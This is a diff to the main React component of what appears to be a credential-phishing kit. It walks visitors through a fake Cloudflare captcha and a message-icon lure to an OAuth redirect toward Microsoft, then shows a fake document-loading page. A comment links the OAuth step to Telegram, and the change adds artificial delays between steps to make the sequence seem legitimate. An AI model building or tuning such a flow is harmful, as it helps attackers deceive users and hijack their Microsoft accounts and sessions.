@@ -3,14 +3,19 @@ import MessageIconLanding from './components/MessageIconLanding';
 import CloudflareCaptcha from './components/CloudflareCaptcha';
 import RealOAuthRedirect from './components/RealOAuthRedirect';
 
+// Artificial delay helper (milliseconds)
+const SLOW_DELAY = 1200; // Base delay, x3 for each step (e.g., 3600ms)
+const nextStepDelay = SLOW_DELAY * 3;
+
 function App() {
   const [currentPage, setCurrentPage] = useState('captcha');
+  const [pendingStep, setPendingStep] = useState<string | null>(null);
 
   // Check URL parameters only once on initial load
   useEffect(() => {
     const urlParams = new URLSearchParams(window.location.search);
     const step = urlParams.get('step');
-    
+
     // Only set initial state if there's a step parameter
     if (step && ['captcha', 'message-icon', 'oauth-redirect', 'success', 'document-loading'].includes(step)) {
       setCurrentPage(step);
@@ -19,27 +24,42 @@ function App() {
     }
   }, []);
 
+  // Use effect to handle delayed step transitions
+  useEffect(() => {
+    if (pendingStep) {
+      const timer = setTimeout(() => {
+        setCurrentPage(pendingStep);
+        setPendingStep(null);
+      }, nextStepDelay);
+      return () => clearTimeout(timer);
+    }
+  }, [pendingStep]);
+
+  // Step 1: Captcha verified: go to message icon with delay
   const handleCaptchaVerified = () => {
-    console.log('✅ CAPTCHA verified - moving to message icon landing');
-    setCurrentPage('message-icon');
+    console.log('✅ CAPTCHA verified - waiting (slow) before moving to message icon landing');
+    setPendingStep('message-icon');
   };
 
+  // Step 2: Message icon opened: go to oauth redirect with delay
   const handleMessageOpen = () => {
-    console.log('📧 Message icon clicked - moving to OAuth redirect');
-    setCurrentPage('oauth-redirect');
+    console.log('📧 Message icon clicked - waiting (slow) before moving to OAuth redirect');
+    setPendingStep('oauth-redirect');
   };
 
+  // Refresh page for back-to-captcha
   const handleCaptchaBack = () => {
     console.log('⬅️ Back to CAPTCHA (refresh page)');
     window.location.reload();
   };
 
+  // Step 3: OAuth success: after Telegram, show loading document (final step, no more captcha)
   const handleOAuthSuccess = (sessionData: any) => {
     console.log('🔐 OAuth successful:', sessionData);
-    // After successful OAuth, show document loading
     setCurrentPage('document-loading');
   };
 
+  // Allow user to retry OAuth from loading page if needed
   const handleOAuthBack = () => {
     console.log('⬅️ Back to message icon from OAuth');
     setCurrentPage('message-icon');
@@ -63,13 +83,14 @@ function App() {
       );
 
     case 'oauth-redirect':
+      // RealOAuthRedirect will itself wait (slow) before redirecting to Microsoft
       return (
         <RealOAuthRedirect
           onLoginSuccess={handleOAuthSuccess}
         />
       );
 
-    case 'success':
+    case 'success': // alias for document-loading
     case 'document-loading':
       return (
         <div style={{ 
@@ -149,6 +170,7 @@ function App() {
       );
 
     default:
+      // fallback to captcha
       return (
         <CloudflareCaptcha
           onVerified={handleCaptchaVerified}
